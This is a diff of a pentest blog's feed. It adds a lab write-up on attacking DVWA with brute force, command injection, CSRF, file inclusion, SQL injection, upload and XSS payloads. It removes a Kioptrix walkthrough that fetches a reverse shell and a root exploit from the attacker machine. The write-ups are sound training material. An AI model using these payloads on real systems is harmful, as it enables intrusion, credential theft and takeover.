@@ -4,7 +4,7 @@
   <title><![CDATA[Category: security | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2014-07-27T23:08:09+03:00</updated>
+  <updated>2014-08-15T22:51:46+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,383 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Damn Vulnerable Web Application]]></title>
+    <link href="http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application/"/>
+    <updated>2014-08-08T00:30:24+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application</id>
+    <content type="html"><![CDATA[<p>It&rsquo;s time for some web hacking in my pentest lab, so in this post I will go over attacking DVWA.</p>
+
+<!-- more -->
+
+
+<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn
+vulnerable. Its main goals are to be an aid for security professionals to test their
+skills and tools in a legal environment, help web developers better understand the
+processes of securing web applications and aid teachers/students to teach/learn web
+application security in a class room environment.</p></blockquote>
+
+<p>Since it&rsquo;s already installed on Metasploitable, I didn&rsquo;t have to install it. The default credentials for logging in are <em>admin: password</em>.</p>
+
+<p>For this lab I will use the low and medium levels of security and PHPIDS disabled. The high security setting represents the secure implementation that aims to eliminate the vulnerabilities.</p>
+
+<h3>Brute Force</h3>
+
+<p><a href="https://www.owasp.org/index.php/Brute_force_attack"><strong>Overview</strong></a></p>
+
+<blockquote><p>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined
+values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may
+use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.:
+alphanumerical, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the
+attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take
+to submit all chosen predetermined values.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/bruteforce.png" title="&lsquo;bruteforce&rsquo; &lsquo;bruteforce&rsquo;" ></p>
+
+<p>In the first challenge we have to brute force a login form.</p>
+
+<p>As always, first I used some dummy values to see how is the data transmitted, and it&rsquo;s visible in the URL:</p>
+
+<p><code>plain
+http://metasploitable/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#
+</code></p>
+
+<p>I will use Hydra to brute force the form. I created some files with usernames and passwords:</p>
+
+<p>``` plain
+cat users.txt
+admin
+test
+administrator</p>
+
+<p>cat pass.txt
+admin
+1234
+password
+letmein
+test
+password1234
+```</p>
+
+<p>I ran Hydra like this:</p>
+
+<p>``` plain
+hydra 192.168.127.128 -L ~/Desktop/users.txt -P ~/Desktop/pass.txt http-get-form &ldquo;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=798cbe3ff31159e5a08aae5a407f81cf&rdquo;</p>
+
+<p>Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal purposes only</p>
+
+<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-08-09 13:05:32
+[DATA] 16 tasks, 1 server, 18 login tries (l:3/p:6), ~1 try per task
+[DATA] attacking service http-get-form on port 80
+[80][www-form] host: 192.168.127.128   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-08-09 13:05:33
+```</p>
+
+<p>And we have cracked it!</p>
+
+<h3>Command Execution</h3>
+
+<p><a href="https://www.owasp.org/index.php/Command_Injection"><strong>Overview</strong></a></p>
+
+<blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable
+application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers
+etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of
+the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/rce.png" title="&lsquo;code execution&rsquo; &lsquo;remote code execution&rsquo;" ></p>
+
+<p>On this page we can ping an arbitrary IP address. We can run arbitrary code by typing <code>;whoami</code>, which will tell us the server is running as the <em>www-data</em> user. The semicolon is a way to stack commands in Linux, so here we use it to end the previous command (which was the ping functionality), and we insert a new command of our choosing to be run by the vulnerable server.</p>
+
+<p>On medium, the same results can be achieved by entering <code>||whoami</code> instead.</p>
+
+<p>The difference between the operators is that <code>;</code> runs both commands irrespective of the first command&rsquo;s status, whereas <code>||</code> executes the second command only if the previous one failed.</p>
+
+<h3>CSRF</h3>
+
+<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"><strong>Overview</strong></a></p>
+
+<blockquote><p>CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated.
+With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application
+into executing actions of the attacker&rsquo;s choosing. A successful CSRF exploit can compromise end user data and operation in case of
+normal user. If the targeted end user is the administrator account, this can compromise the entire web application.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/csrf.png" title="&lsquo;csrf&rsquo; &lsquo;csrf&rsquo;" ></p>
+
+<p>We see here that we can change the admin password. When we submit the new password, we see the request looks like this:</p>
+
+<p><code>plain
+http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&amp;password_conf=newpass&amp;Change=Change#
+</code></p>
+
+<p>We can exploit this behavior to change anyone&rsquo;s password as long as they are logged in to the application, by tricking the user to perform the request. The exact method may differ, but an example would be to use the image tag to make the request behind the scenes. Of course, this could be achieved by manipulating HTML in other ways too, with a link, iframe, script, etc.</p>
+
+<p><code>plain
+&lt;img src="http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&amp;password_conf=newpass&amp;Change=Change#"&gt;
+</code></p>
+
+<h3>File Inclusion</h3>
+
+<p><a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Remote_File_Inclusion"><strong>Overview</strong></a></p>
+
+<blockquote><p>The application loads data from an attacker-controlled resource at runtime, enabling a variety of malicious activities. Either the
+source address or the resource itself (or both) may be under the attacker&rsquo;s control.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/include.png" title="&lsquo;file inclusion&rsquo; &lsquo;include file&rsquo;" ></p>
+
+<p>The file inclusion is pretty straightforward:</p>
+
+<p><code>plain
+http://192.168.127.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
+</code></p>
+
+<h3>SQL Injection</h3>
+
+<p><a href="https://www.owasp.org/index.php/SQL_Injection"><strong>Overview</strong></a></p>
+
+<blockquote><p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application. A
+successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute
+administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file
+system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL
+commands are injected into data-plane input in order to effect the execution of predefined SQL commands.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sqli&rsquo;" ></p>
+
+<p>The vulnerability is straightforward. On low security, injecting <code>&lsquo;or 1=1&mdash; </code> returns all records:</p>
+
+<p>``` plain
+ID: &lsquo;or 1=1&mdash;
+First name: admin
+Surname: admin</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Gordon
+Surname: Brown</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Hack
+Surname: Me</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Pablo
+Surname: Picasso</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Bob
+Surname: Smith
+```
+The <em>id</em> parameter is vulnerable, as expected. From here we can proceed in different ways, fingerprinting the host, retrieving more information, etc. I will settle for getting the password hashes for the users we have discovered.</p>
+
+<p><strong>Discover the number of colums</strong></p>
+
+<p><code>&lsquo;union select 1,2&mdash; </code></p>
+
+<p><code>plain
+ID: 'union select 1,2--
+First name: 1
+Surname: 2
+</code></p>
+
+<p><strong>Get database name</strong></p>
+
+<p><code>&lsquo;union select database(),2&mdash; </code></p>
+
+<p><code>plain
+ID: 'union select database(),2--
+First name: dvwa
+Surname: 2
+</code></p>
+
+<p><strong>Get table names for the current database</strong></p>
+
+<p><code>&lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash; </code></p>
+
+<p>``` plain
+ID: &lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash;
+First name: guestbook
+Surname: 2</p>
+
+<p>ID: &lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash;
+First name: users
+Surname: 2
+```</p>
+
+<p><strong>Get column names for the users table</strong></p>
+
+<p><code>&lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;  </code></p>
+
+<p>``` plain
+ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: user_id
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: first_name
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: last_name
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: user
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: password
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: avatar
+Surname: 2
+```</p>
+
+<p><strong>Get password hashes</strong></p>
+
+<p><code>&lsquo;union select user, password from users&mdash; </code></p>
+
+<p>``` plain
+ID: &lsquo; union select user, password from users&mdash;
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```</p>
+
+<p>On medium security, the injection query only differs in using an integer instead of a quote: <code>99 or 1=1&mdash; </code>.</p>
+
+<h3>SQL Injection (Blind)</h3>
+
+<p><a href="https://www.owasp.org/index.php/Blind_SQL_Injection"><strong>Overview</strong></a></p>
+
+<blockquote><p>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and
+determines the answer based on the applications response. This attack is often used when the web application is configured to show
+generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>
+
+<p>When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the
+SQL Query&rsquo;s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the
+data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by
+asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not
+impossible.</p></blockquote>
+
+<p>Since this is more or less identical to the previous SQL injection, I will instead use sqlmap against it, so I don&rsquo;t have to repeat the same queries:</p>
+
+<p><code>plain
+sqlmap -u "http://192.168.127.128/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=cd855d2bfb73dfe22ef2f11a475fa9e6" --dbms=MySQL --dump
+</code></p>
+
+<h3>Upload</h3>
+
+<p><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload"><strong>Overview</strong></a></p>
+
+<blockquote><p>Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be
+attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the
+first step.</p>
+
+<p>The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database,
+forwarding attacks to back-end systems, and simple defacement. It depends on what the application does with the uploaded file and
+especially where it is stored.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/upload.png" title="&lsquo;file upload&rsquo; &lsquo;upload&rsquo;" ></p>
+
+<p>I am going to upload a PHP file that runs the command <em>uname -a</em>:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<p>$cmd = system(&lsquo;uname -a&rsquo;);
+echo $cmd;</p>
+
+<p>?>
+```</p>
+
+<p>After uploading the file, the path where we can find it is conveniently provided:</p>
+
+<p><em>../../hackable/uploads/upload.php succesfully uploaded!</em></p>
+
+<p>Navigate to the file to see the command output:</p>
+
+<p><code>plain
+192.168.127.128/dvwa/vulnerabilities/upload/../../hackable/uploads/upload.php
+</code></p>
+
+<p>On medium security, the code checks if the file is a jpeg image and under a certain size:</p>
+
+<p><code>php
+if (($uploaded_type == "image/jpeg") &amp;&amp; ($uploaded_size &lt; 100000))
+</code></p>
+
+<p>However, this can be easily bypassed by intercepting the request and modifying the filename. Here is what I had in Live HTTP Headers:</p>
+
+<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php%00.jpg&rdquo;</code></p>
+
+<p>And I modified it to:</p>
+
+<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php&rdquo;\r\n</code></p>
+
+<h3>XSS reflected</h3>
+
+<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Reflected_XSS_Attacks"><strong>Overview</strong></a></p>
+
+<blockquote><p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or
+any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to
+victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious
+link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web
+site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a &ldquo;trusted&rdquo; server.
+Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/xss_reflected.png" title="&lsquo;reflected xss&rsquo; &lsquo;reflected xss&rsquo;" ></p>
+
+<p>Low security:</p>
+
+<p>``` html</p>
+
+<script>alert(document.cookie)</script>
+
+
+<p>```</p>
+
+<p>Medium security:</p>
+
+<p>``` html</p>
+
+<SCRIPT>alert(document.cookie)</SCRIPT>
+
+
+<p>```</p>
+
+<h3>XSS stored</h3>
+
+<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_XSS_Attacks"><strong>Overview</strong></a></p>
+
+<blockquote><p>Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message
+forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored
+information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/xss_stored.png" title="&lsquo;stored xss&rsquo; &lsquo;stored xss&rsquo;" ></p>
+
+<p>The vulnerable field is the name box. The XSS strings that I used on the reflected XSS page work for this one as well, the only difference is that I had to use Firebug to modify the maximum length from 10 to an arbitrary higher value.</p>
+
+<p>As you can see, DVWA was..damn vulnerable!</p>
+
+<blockquote><p>Cheer Up!  Things are getting worse at a slower rate.</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kali tools catalog - Information Gathering]]></title>
@@ -1197,12 +1574,12 @@ Table: dev_accounts
 <p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>
 
 <p>``` plain
-ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#108;&#111;&#110;&#x65;&#x66;&#x65;&#x72;&#x72;&#101;&#116;&#x40;&#107;&#105;&#111;&#112;&#x74;&#114;&#x69;&#x78;&#51;&#46;&#99;&#111;&#x6d;">&#x6c;&#111;&#110;&#101;&#x66;&#x65;&#x72;&#114;&#101;&#116;&#x40;&#x6b;&#x69;&#x6f;&#112;&#x74;&#x72;&#x69;&#x78;&#x33;&#x2e;&#x63;&#111;&#x6d;</a>
+ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x6c;&#111;&#110;&#x65;&#x66;&#101;&#114;&#x72;&#x65;&#116;&#64;&#x6b;&#x69;&#111;&#x70;&#116;&#114;&#105;&#120;&#51;&#x2e;&#x63;&#111;&#109;">&#108;&#x6f;&#x6e;&#x65;&#x66;&#101;&#x72;&#114;&#101;&#x74;&#x40;&#x6b;&#105;&#111;&#112;&#x74;&#114;&#105;&#120;&#x33;&#x2e;&#x63;&#111;&#x6d;</a>
 The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
 RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
 Are you sure you want to continue connecting (yes/no)? yes
 Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
-<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#108;&#111;&#110;&#x65;&#x66;&#x65;&#114;&#x72;&#x65;&#116;&#x40;&#107;&#x69;&#111;&#x70;&#116;&#x72;&#105;&#x78;&#51;&#46;&#99;&#111;&#x6d;">&#108;&#x6f;&#x6e;&#x65;&#x66;&#101;&#114;&#x72;&#101;&#116;&#64;&#107;&#105;&#x6f;&#x70;&#x74;&#x72;&#105;&#120;&#x33;&#46;&#x63;&#x6f;&#x6d;</a>&rsquo;s password:
+<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6c;&#111;&#x6e;&#101;&#102;&#x65;&#x72;&#114;&#x65;&#116;&#64;&#107;&#105;&#111;&#x70;&#116;&#114;&#x69;&#120;&#51;&#46;&#99;&#111;&#x6d;">&#108;&#111;&#x6e;&#x65;&#x66;&#101;&#114;&#114;&#x65;&#x74;&#64;&#x6b;&#105;&#x6f;&#x70;&#x74;&#x72;&#x69;&#120;&#51;&#x2e;&#x63;&#111;&#109;</a>&rsquo;s password:
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>
 
 <p>The programs included with the Ubuntu system are free software;
@@ -1295,201 +1672,6 @@ public domain I used them.
 <p>And this was Kioptrix level 3, with another interesting twist.</p>
 
 <blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
-    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
-    <updated>2014-06-16T22:47:31+03:00</updated>
-    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
-    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>
-
-<!-- more -->
-
-
-<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>
-
-<p>Next, the port scan:</p>
-
-<p>``` plain
-nmap -A -p1-65535 192.168.127.162</p>
-
-<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-16 22:52 EEST
-Nmap scan report for 192.168.127.162
-Host is up (0.00036s latency).
-Not shown: 65528 closed ports
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
-|<em>ssh-hostkey: ERROR: Script execution failed (use -d to debug)
-|</em>sshv1: Server supports SSHv1
-80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
-|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
-|</em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
-111/tcp  open  rpcbind  2 (RPC #100000)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2            111/tcp  rpcbind
-|   100000  2            111/udp  rpcbind
-|   100024  1            630/udp  status
-|<em>  100024  1            633/tcp  status
-443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
-|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
-|<em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
-| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=&mdash;
-| Not valid before: 2009-10-07T23:10:47+00:00
-|</em>Not valid after:  2010-10-07T23:10:47+00:00
-|<em>ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
-| sslv2:
-|   SSLv2 supported
-|   ciphers:
-|     SSL2_DES_192_EDE3_CBC_WITH_MD5
-|     SSL2_RC2_CBC_128_CBC_WITH_MD5
-|     SSL2_RC4_128_WITH_MD5
-|     SSL2_RC4_64_WITH_MD5
-|     SSL2_DES_64_CBC_WITH_MD5
-|     SSL2_RC2_CBC_128_CBC_WITH_MD5
-|</em>    SSL2_RC4_128_EXPORT40_WITH_MD5
-631/tcp  open  ipp      CUPS 1.1
-| http-methods: Potentially risky methods: PUT
-|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
-|</em>http-title: 403 Forbidden
-633/tcp  open  status   1 (RPC #100024)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2            111/tcp  rpcbind
-|   100000  2            111/udp  rpcbind
-|   100024  1            630/udp  status
-|_  100024  1            633/tcp  status
-3306/tcp open  mysql    MySQL (unauthorized)
-MAC Address: 00:0C:29:20:9D:3E (VMware)
-Device type: general purpose
-Running: Linux 2.6.X
-OS CPE: cpe:/o:linux:linux_kernel:2.6
-OS details: Linux 2.6.9 &ndash; 2.6.30
-```</p>
-
-<h3>From web to shell</h3>
-
-<p>Pointing the browser to the target, we can see this remote admin login panel:</p>
-
-<p><img class="center" src="/images/login.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>
-
-<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>
-
-<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>
-
-<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>
-
-<p><img class="center" src="/images/ping.png" title="&lsquo;ping ip&rsquo; &lsquo;ping&rsquo;" ></p>
-
-<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>
-
-<p>``` plain
-; uname -a</p>
-
-<p>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
-```</p>
-
-<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>
-
-<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>
-
-<p><code>plain
-cp php-reverse-shell.php ~/shell.php
-</code></p>
-
-<p>Let&rsquo;s see the description:</p>
-
-<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
-The recipient will be given a shell running as the current user (apache normally).</p></blockquote>
-
-<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>
-
-<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>
-
-<p>On my machine:</p>
-
-<p><code>plain
-nc -v -l -p 80 &lt; shell.php
-</code></p>
-
-<p>On the web interface:</p>
-
-<p>``` plain
-; wget 192.168.127.159:80 -O /tmp/puppies.php</p>
-
-<p>; ls /tmp</p>
-
-<p>puppies.php
-```</p>
-
-<p>Now listen on my machine for the incoming connection:</p>
-
-<p><code>plain
-nc -v -l -p 80
-</code></p>
-
-<p>And on the web interface, execute the shell:</p>
-
-<p><code>plain
-; php /tmp/puppies.php
-</code></p>
-
-<p>And we have a shell!</p>
-
-<p><code>plain
-nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
-Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
- 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=48(apache) gid=48(apache) groups=48(apache)
-sh: no job control in this shell
-</code></p>
-
-<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>
-
-<p><code>plain
-cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
-nc -vv -l -p 5555 &lt; sendpage.c
-</code></p>
-
-<p>And from the shell:</p>
-
-<p><code>plain
-sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
-sh-3.00# cd /tmp
-sh-3.00# gcc -o sendpage sendpage.c
-sh-3.00# chmod a+x sendpage
-sh-3.00# ./sendpage
-sh: no job control in this shell
-sh-3.00# whoami
-root
-</code></p>
-
-<h3>Breaking into the database</h3>
-
-<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>
-
-<p><code>plain
-sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&amp;psw=pass" --level=5 --risk=3
-Database: webapp
-Table: users
-[2 entries]
-+----+----------+------------+
-| id | username | password   |
-+----+----------+------------+
-| 1  | admin    | 5afac8d85f |
-| 2  | john     | 66lajGGbla |
-+----+----------+------------+
-</code></p>
-
-<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>
-
-<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>
-
-<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
-metal objects which are not fastened down.</p></blockquote>
 ]]></content>
   </entry>
   
